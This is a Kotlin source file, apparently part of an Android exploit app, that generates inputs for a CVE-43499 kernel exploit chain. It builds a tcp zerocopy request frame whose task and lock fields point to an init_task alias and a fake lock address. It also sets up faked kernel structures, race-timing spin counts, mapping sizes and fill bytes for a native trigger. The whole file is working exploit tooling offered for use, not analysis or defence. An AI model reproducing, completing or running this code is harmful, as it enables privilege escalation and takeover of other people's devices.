package com.ghostlock.app.backend.cve43499.generator

import com.ghostlock.app.backend.cve43499.flow.Cve43499GeneratedInputs
import com.ghostlock.app.backend.cve43499.flow.Cve43499PostPlacementGenerator
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.jni.Native43499TcpZerocopySpec
import com.ghostlock.app.jni.Native43499PrimitiveSpec

/**
 * tcp zerocopy 输入 generator（R3b）：由 placement facts 生成 0x40 zc 帧、
 * mappingSize=16 MiB、receiveSize=64、zc 四字段偏移、armSequence=16、
 * punch 相位上限与 postHold 迭代 20000、双 fill 值（0x33 send / 0x55 mapping）。
 *
 * 数据来源（只读参考）：
 * - zc 请求体：legacy2 `route_tcp.cpp:317-327`（memset 0，写 address@0x18、
 *   length@0x20=sendbuf、task@0x28=init_task alias、lock@0x30=fake_lock）；
 * - 参数：`route_tcp_session.cpp.disabled:52-64`（mapping=16 MiB、frame=0x40、
 *   sendbuf=64、sendbuf_fill=0x33、mapping_fill=0x55、punch_phase_spin=10,000,000）；
 * - landing 字节：legacy2 `support.cpp` tcp 布局（payload_delta=0、chunk_bias=0xe80、
 *   fake_task=0x5800）。
 *
 * @note mapping 地址字段（zc@0x18）由 Native 运行时按自己的 mmap 计算，generator
 *   无法预知；帧模板该字段保持 0，Native 在每次 attempt 前写入。
 * @note 纯函数；不触 Native、不持有 token。阶段：R3b；真机未验证。
 */
internal class Cve43499TcpZerocopyInputGenerator(
    private val context: Cve43499GeneratorContext,
) : Cve43499PostPlacementGenerator, Cve43499WriteGenerator {
    /**
     * 生成 W1 landing + tcp PrimitiveSpec（R3b 兼容入口）。
     *
     * @param facts Placement 事务回传的只读物理事实。
     * @return Flow 使用的生成输入。
     */
    override fun generate(facts: Cve43499PlacementFacts): Cve43499GeneratedInputs =
        generateForWrite(facts, context.w1WriteRequest())

    /**
     * 生成指定写请求的 landing + tcp PrimitiveSpec（R3d 多写链）。
     *
     * @param facts Placement 事务回传的只读物理事实（pageSize 用于 mapping_offset）。
     * @param request 本事务写请求。
     * @return Flow 使用的生成输入。
     * @throws Cve43499GeneratorException 事实/配置非法（fail-closed）。
     */
    override fun generateForWrite(
        facts: Cve43499PlacementFacts,
        request: Cve43499WriteRequest,
    ): Cve43499GeneratedInputs {
        val generator = context.debug.generator
        val tcp = generator.tcp
        val payload = Cve43499PayloadBuilder.build(
            facts = facts,
            context = context,
            tcpLayout = true,
            request = request,
        )
        val pageAccept = pageAcceptParameters(
            request = request,
            writeValueOffset = generator.payload.writeValueOffset,
            pageAcceptBit = generator.payload.pageAcceptBit,
        )
        validate(facts, tcp)
        val initTaskAlias = context.dataAlias(context.debug.offsets.initTask)
        val frame = buildFrame(tcp, initTaskAlias, payload.fakeLock)
        val spec = Native43499TcpZerocopySpec(
            finalWaiterAddress = payload.fakeW0,
            /* waiter->task 写 init_task 的 data alias（legacy `in.waiter_task`）。 */
            finalTaskAddress = initTaskAlias,
            finalLockAddress = payload.fakeLock,
            frameBytes = frame,
            mappingSize = tcp.mappingSize,
            receiveSize = tcp.receiveSize,
            mappingOffset = facts.pageSize,
            operationBudget = tcp.operationBudget,
            timeoutNanos = tcp.timeoutNanos,
            punchSpin = tcp.punchSpin,
            postHoldNs = tcp.postHoldIterations,
            zcAddressOffset = tcp.zcAddressOffset,
            maxMapping = tcp.maxMapping,
            maxFrame = tcp.maxFrame,
            armSequence = tcp.armSequence,
            zcLengthOffset = tcp.zcLengthOffset,
            zcTaskOffset = tcp.zcTaskOffset,
            zcLockOffset = tcp.zcLockOffset,
            punchPhaseSpin = tcp.punchPhaseSpin,
            sendFillByte = tcp.sendFillByte,
            mappingFillByte = tcp.mappingFillByte,
            primitiveKind = Native43499PrimitiveSpec.KIND_TCP_ZEROCOPY_RECEIVE,
        )
        return Cve43499GeneratedInputs(
            landing = context.landingConfig(payload.bytes, pageAccept),
            primitive = spec,
        )
    }

    /**
     * 校验 tcp 规格自洽（与 Native `glk43499_carrier_tcp_prepare` 同形，给可检索 reason）。
     *
     * @param facts Placement 事实（pageSize）。
     * @param tcp tcp generator 参数。
     * @throws Cve43499GeneratorException 任一边界非法。
     */
    private fun validate(
        facts: Cve43499PlacementFacts,
        tcp: com.ghostlock.app.data.cve43499.DebugTcpGenerator,
    ) {
        val pageSize = facts.pageSize
        if (pageSize <= 0L) throw Cve43499GeneratorException("tcp:page-size")
        if (tcp.mappingSize <= 0L || tcp.mappingSize % pageSize != 0L ||
            tcp.mappingSize < pageSize * TCP_MIN_MAPPING_PAGES ||
            tcp.mappingSize > tcp.maxMapping
        ) {
            throw Cve43499GeneratorException("tcp:mapping-size")
        }
        if (tcp.frameSize <= 0L || tcp.frameSize > tcp.maxFrame ||
            tcp.frameSize > pageSize || tcp.frameSize < 16L
        ) {
            throw Cve43499GeneratorException("tcp:frame-size")
        }
        if (tcp.receiveSize <= 0L || tcp.receiveSize > pageSize ||
            tcp.receiveSize > tcp.maxFrame
        ) {
            throw Cve43499GeneratorException("tcp:receive-size")
        }
        if (tcp.armSequence <= 0L || tcp.postHoldIterations <= 0L ||
            tcp.punchSpin <= 0L || tcp.punchPhaseSpin <= 0L
        ) {
            throw Cve43499GeneratorException("tcp:execution-parameters")
        }
        if (tcp.sendFillByte !in 0L..0xffL || tcp.mappingFillByte !in 0L..0xffL) {
            throw Cve43499GeneratorException("tcp:fill-byte")
        }
        /* zc 四字段：对齐、在帧内、互不重叠（T5 的 generator 侧同形校验）。 */
        val fields = listOf(
            ZcField(tcp.zcAddressOffset, 8L),
            ZcField(tcp.zcLengthOffset, 4L),
            ZcField(tcp.zcTaskOffset, 8L),
            ZcField(tcp.zcLockOffset, 8L),
        )
        for (field in fields) {
            if (field.offset % field.width != 0L ||
                field.offset < 0L ||
                field.offset > tcp.frameSize - field.width
            ) {
                throw Cve43499GeneratorException("tcp:zc-offset")
            }
        }
        for (index in fields.indices) {
            for (other in 0 until index) {
                val first = fields[other]
                val second = fields[index]
                if (second.offset < first.offset + first.width &&
                    first.offset < second.offset + second.width
                ) {
                    throw Cve43499GeneratorException("tcp:zc-offsets-overlap")
                }
            }
        }
    }

    /**
     * 构造 0x40 zc 请求体模板（Native 每次 attempt 会写入 address/length/task/lock）。
     *
     * @param tcp tcp generator 参数。
     * @param initTaskAlias waiter->task 的 data alias。
     * @param fakeLock waiter->lock 的最终地址。
     * @return 帧字节（其余字段 0）。
     */
    private fun buildFrame(
        tcp: com.ghostlock.app.data.cve43499.DebugTcpGenerator,
        initTaskAlias: Long,
        fakeLock: Long,
    ): ByteArray {
        val writer = Cve43499LeWriter(ByteArray(tcp.frameSize.toInt()))
        /* 0x18 映射地址由 Native 运行时写入；模板保持 0。 */
        writer.putU32(tcp.zcLengthOffset, tcp.receiveSize)
        writer.putU64(tcp.zcTaskOffset, initTaskAlias)
        writer.putU64(tcp.zcLockOffset, fakeLock)
        return writer.bytesView()
    }

    /**
     * @property offset 字段起始偏移。
     * @property width 字段宽度（字节）。
     */
    private data class ZcField(val offset: Long, val width: Long)

    private companion object {
        /** Native `GLK43499_TCP_MIN_MAPPING_PAGES` 的同源下限（2 页）。 */
        private const val TCP_MIN_MAPPING_PAGES = 2L
    }
}
